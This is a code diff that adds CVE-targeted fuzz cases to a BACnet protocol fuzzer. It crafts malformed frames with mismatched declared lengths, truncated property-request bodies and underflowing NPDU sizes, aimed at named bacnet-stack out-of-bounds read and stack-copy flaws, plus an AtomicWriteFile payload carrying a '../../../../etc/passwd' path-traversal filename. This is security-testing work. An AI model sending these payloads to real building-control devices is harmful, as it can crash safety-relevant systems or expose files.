@@ -196,6 +196,34 @@ class BACnetFuzzer(BaseFuzzer):
             RequestInfo(
                 "BACnet_Auth_Services", "Authenticate and RequestKey service fuzzing", "auth"
             ),
+            # Length-desync / truncation class (bacnet-stack OOB-read family)
+            RequestInfo(
+                "BACnet_APDU_Truncated",
+                "RPM/WPM APDU truncated below declared length - OOB read "
+                "(CVE-2026-41503, CVE-2026-41475)",
+                "overflow",
+            ),
+            RequestInfo(
+                "BACnet_APDU_Length_Underflow",
+                "Tiny/short WriteProperty + 2-byte NPDU length underflow "
+                "(CVE-2026-26264, CVE-2025-66624)",
+                "malformed",
+            ),
+            RequestInfo(
+                "BACnet_BVLC_Forwarded_NPDU",
+                "BVLC Forwarded-NPDU (0x04) with mismatched length (CVE-2018-10238)",
+                "malformed",
+            ),
+            RequestInfo(
+                "BACnet_AtomicFile_Payload",
+                "AtomicReadFile/AtomicWriteFile payload + path-traversal filename (CVE-2019-12480)",
+                "overflow",
+            ),
+            RequestInfo(
+                "BACnet_BVLL_Length_Desync",
+                "Fuzzable BVLL Length field (declared>/<actual, 0x0000, 0xFFFF)",
+                "boundary",
+            ),
         ]
 
     def __init__(self, config, connection_factory=None):
@@ -1431,6 +1459,270 @@ class BACnetFuzzer(BaseFuzzer):
         )
 
         # ================================================================
+        # LENGTH-DESYNC / TRUNCATION CLASS
+        # bacnet-stack OOB-read crown jewels: the decoder trusts the
+        # declared BVLL/NPDU length and walks ASN.1 tags past the buffer.
+        # ================================================================
+
+        # 1. BACnet_APDU_Truncated (CVE-2026-41503 RPM, CVE-2026-41475 WPM)
+        # BVLL_Length statically claims a full 19-byte frame, but the APDU
+        # tail is a Group of progressively-truncated Read/WritePropertyMultiple
+        # bodies whose trailing tag/property octets are ABSENT. declared > actual.
+        apdu_truncated = Request(
+            "BACnet_APDU_Truncated",
+            children=(
+                Block(
+                    "BVLC_Header_TRUNC",
+                    children=(
+                        Byte("BVLL_Type", 0x81),
+                        Byte("BVLL_Function", 0x0A),
+                        # Static full-frame length (19); real content is shorter.
+                        Word("BVLL_Length", 0x0013, endian=">"),
+                    ),
+                ),
+                Block(
+                    "NPDU_Header_TRUNC",
+                    children=(
+                        Byte("NPDU_Version", 0x01),
+                        Byte("NPDU_Control", 0x04),  # still claims a full reply
+                    ),
+                ),
+                # Truncated APDU bodies. Each declares a tag whose data runs
+                # past the frame end -> OOB read in the RPM/WPM decoder.
+                Group(
+                    "Truncated_APDU",
+                    values=[
+                        # RPM: object-id tag [0] declares 4 bytes, only 2 present
+                        b"\x00\x05\x05\x0e\x0c\x02\x00",
+                        # RPM: property-list opened, property tag declared, no value
+                        b"\x00\x05\x05\x0e\x0c\x02\x00\x04\xd2\x1e\x09",
+                        # RPM: everything but the closing tag 0x1f is missing
+                        b"\x00\x05\x05\x0e\x0c\x02\x00\x04\xd2\x1e\x09\x4d",
+                        # WPM: service header only, no object specifier at all
+                        b"\x00\x00\x06\x10",
+                        # WPM: opening list tag with a dangling context tag
+                        b"\x00\x00\x06\x10\x0c\x00\x80\x00\x01\x1e\x09",
+                        # Confirmed header + nothing (APDU claims more, delivers 0)
+                        b"\x00\x05\x05\x0e",
+                    ],
+                ),
+            ),
+        )
+
+        # 2. BACnet_APDU_Length_Underflow
+        # CVE-2026-26264 WriteProperty apdu_len - apdu_size underflow, and
+        # CVE-2025-66624 short-NPDU (2-byte NPDU). The frame passes the
+        # version check then the size math wraps on a too-small buffer.
+        apdu_length_underflow = Request(
+            "BACnet_APDU_Length_Underflow",
+            children=(
+                Block(
+                    "BVLC_Header_UND",
+                    children=(
+                        Byte("BVLL_Type", 0x81),
+                        Byte("BVLL_Function", 0x0A),
+                        # Declares 23 bytes; the tail delivers 1-5. declared >> actual.
+                        Word("BVLL_Length", 0x0017, endian=">"),
+                    ),
+                ),
+                # NPDU+APDU collapsed into a single fuzzable tail so we can
+                # deliver frames shorter than a minimal NPDU/APDU.
+                Group(
+                    "Underflow_Tail",
+                    values=[
+                        b"\x01",  # NPDU version only (1 byte) - truncated NPDU
+                        b"\x01\x04",  # 2-byte NPDU, no APDU (CVE-2025-66624)
+                        b"\x01\x04\x00",  # + APDU type only, apdu_size=1 underflow
+                        b"\x01\x04\x00\x0f",  # WriteProperty choice, no invoke/data
+                        b"\x01\x04\x00\x0f\x02",  # + invoke id, empty service data
+                    ],
+                ),
+            ),
+        )
+
+        # 3. BACnet_BVLC_Forwarded_NPDU (CVE-2018-10238)
+        # bvlc_encode_forwarded_npdu stack copy: BVLC function 0x04 carries a
+        # 6-byte Originating B/IP address then the NPDU. An oversized/mismatched
+        # BVLC Length drives the copy past the stack buffer.
+        bvlc_forwarded_npdu = Request(
+            "BACnet_BVLC_Forwarded_NPDU",
+            children=(
+                Block(
+                    "BVLC_Header_FWD",
+                    children=(
+                        Byte("BVLL_Type", 0x81),
+                        # 0x04 Forwarded-NPDU first (asserted); also probe
+                        # Register-Foreign-Device (0x05) and Read-BDT (0x02).
+                        Group(
+                            "BVLL_Function_FWD",
+                            values=[
+                                b"\x04",  # Forwarded-NPDU
+                                b"\x05",  # Register-Foreign-Device
+                                b"\x02",  # Read-Broadcast-Distribution-Table
+                            ],
+                        ),
+                        Group(
+                            "BVLL_Length_FWD",
+                            values=[
+                                b"\x00\x12",  # correct 18-byte frame (baseline)
+                                b"\xff\xff",  # oversized (65535) vs tiny frame
+                                b"\x00\x60",  # mismatch (declares 96)
+                                b"\x00\x04",  # underflow (< header)
+                            ],
+                        ),
+                    ),
+                ),
+                Block(
+                    "Originating_Address_FWD",
+                    children=(
+                        # 6-octet B/IP address = 4-byte IPv4 + 2-byte UDP port
+                        DWord("Originating_IP", 0xC0A80101, endian=">"),  # 192.168.1.1
+                        Word("Originating_Port", 0xBAC0, endian=">"),  # 47808
+                    ),
+                ),
+                Block(
+                    "NPDU_Header_FWD",
+                    children=(
+                        Byte("NPDU_Version", 0x01),
+                        Byte("NPDU_Control", 0x20),
+                        Word("DEST_Network", 0xFFFF, endian=">"),
+                        Byte("DLEN", 0x00),
+                        Byte("HOP_Count", 0xFF),
+                    ),
+                ),
+                Block(
+                    "APDU_Header_FWD",
+                    children=(
+                        Byte("APDU_Type", 0x10),  # Unconfirmed
+                        Byte("Service_Choice", BACnetServiceCodes.WHO_IS),
+                    ),
+                ),
+            ),
+        )
+
+        # 4. BACnet_AtomicFile_Payload (CVE-2019-12480)
+        # AtomicReadFile (0x06) / AtomicWriteFile (0x07) with fuzzed
+        # file-start / record-count / requested-octet-count and a
+        # path-traversal filename in the write payload.
+        atomic_file_payload = Request(
+            "BACnet_AtomicFile_Payload",
+            children=(
+                Block(
+                    "BVLC_Header_AF",
+                    children=(
+                        Byte("BVLL_Type", 0x81),
+                        Byte("BVLL_Function", 0x0A),
+                        Word("BVLL_Length", 0x0020, endian=">"),
+                    ),
+                ),
+                Block(
+                    "NPDU_Header_AF",
+                    children=(
+                        Byte("NPDU_Version", 0x01),
+                        Byte("NPDU_Control", 0x04),
+                    ),
+                ),
+                Block(
+                    "APDU_Header_AF",
+                    children=(
+                        Byte("APDU_Type_Flags", 0x00),
+                        Byte("Max_Segs_Resp", 0x05),
+                        Byte("Invoke_ID", 0x06),
+                        Group(
+                            "AtomicFile_Service",
+                            values=[
+                                bytes([BACnetServiceCodes.ATOMIC_READ_FILE]),  # 0x06
+                                bytes([BACnetServiceCodes.ATOMIC_WRITE_FILE]),  # 0x07
+                            ],
+                        ),
+                    ),
+                ),
+                # File object identifier (File object type 10, instance 1)
+                Byte("File_ObjID_Tag", 0x0C),
+                DWord("File_Object_ID", 0x02800001, endian=">"),
+                # Stream-access opening tag [1]
+                Byte("Access_Open_Tag", 0x1E),
+                # fileStartPosition [0] signed int - fuzz start offset
+                Byte("File_Start_Tag", 0x35),
+                Group(
+                    "File_Start_Position",
+                    values=[
+                        b"\x00",
+                        b"\xff",
+                        b"\x7f\xff\xff\xff",  # INT_MAX
+                        b"\x80\x00\x00\x00",  # INT_MIN
+                        b"\xff\xff\xff\xff",  # -1
+                    ],
+                ),
+                # requestedOctetCount / recordCount [1] - fuzz read/write span
+                Byte("Octet_Count_Tag", 0x25),
+                Group(
+                    "Requested_Octet_Count",
+                    values=[
+                        b"\x00",
+                        b"\xff",
+                        b"\xff\xff",
+                        b"\xff\xff\xff\xff",  # 4 GiB span
+                        b"\x00\x00",
+                    ],
+                ),
+                Byte("Access_Close_Tag", 0x1F),
+                # Path-traversal filename delivered as AtomicWriteFile data.
+                Byte("Filename_Tag", 0x75),  # char-string, tag 7
+                SmartString(
+                    "Traversal_Filename",
+                    "../../../../etc/passwd",
+                    max_len=64,
+                    context=StringContext.PATH,
+                ),
+            ),
+        )
+
+        # 5. BACnet_BVLL_Length_Desync
+        # The single change that unlocks the whole truncation class: make the
+        # BVLL Length field itself fuzzable on an otherwise-valid ReadProperty.
+        bvll_length_desync = Request(
+            "BACnet_BVLL_Length_Desync",
+            children=(
+                Block(
+                    "BVLC_Header_DESYNC",
+                    children=(
+                        Byte("BVLL_Type", 0x81),
+                        Byte("BVLL_Function", 0x0A),
+                        Group(
+                            "BVLL_Length_Desync",
+                            values=[
+                                b"\xff\xff",  # declared >> actual (65535)
+                                b"\x00\x40",  # declared > actual
+                                b"\x00\x05",  # declared < actual (too short)
+                                b"\x00\x00",  # zero length
+                            ],
+                        ),
+                    ),
+                ),
+                Block(
+                    "NPDU_Header_DESYNC",
+                    children=(
+                        Byte("NPDU_Version", 0x01),
+                        Byte("NPDU_Control", 0x04),
+                    ),
+                ),
+                Block(
+                    "APDU_Header_DESYNC",
+                    children=(
+                        Byte("APDU_Type_Flags", 0x00),
+                        Byte("Service_Choice", BACnetServiceCodes.READ_PROPERTY),
+                        Byte("Invoke_ID", 0x01),
+                    ),
+                ),
+                Byte("Object_ID_Tag", 0x0C),
+                DWord("Object_ID", 0x020004D2, endian=">"),
+                Byte("Property_ID_Tag", 0x19),
+                Byte("Property_Value", 0x4D),
+            ),
+        )
+
+        # ================================================================
         # OPTIMIZED SESSION CONNECTION ORDERING
         # ================================================================
         # Reordered for maximum early coverage and crash detection:
@@ -1453,6 +1745,22 @@ class BACnetFuzzer(BaseFuzzer):
         if self.is_request_enabled("BACnet_Overflow_Tests"):
             self.session.connect(bvlc_overflow)
             self.session.connect(npdu_control_fuzz)
+
+        # Length-desync / truncation class (bacnet-stack OOB-read family)
+        if self.is_request_enabled("BACnet_APDU_Truncated"):
+            self.session.connect(apdu_truncated)
+
+        if self.is_request_enabled("BACnet_APDU_Length_Underflow"):
+            self.session.connect(apdu_length_underflow)
+
+        if self.is_request_enabled("BACnet_BVLC_Forwarded_NPDU"):
+            self.session.connect(bvlc_forwarded_npdu)
+
+        if self.is_request_enabled("BACnet_AtomicFile_Payload"):
+            self.session.connect(atomic_file_payload)
+
+        if self.is_request_enabled("BACnet_BVLL_Length_Desync"):
+            self.session.connect(bvll_length_desync)
 
         # ==================== PHASE 3: CVE-TARGETED WRITES (~3 min) ====================
         if self.is_request_enabled("BACnet_Write_Operations"):
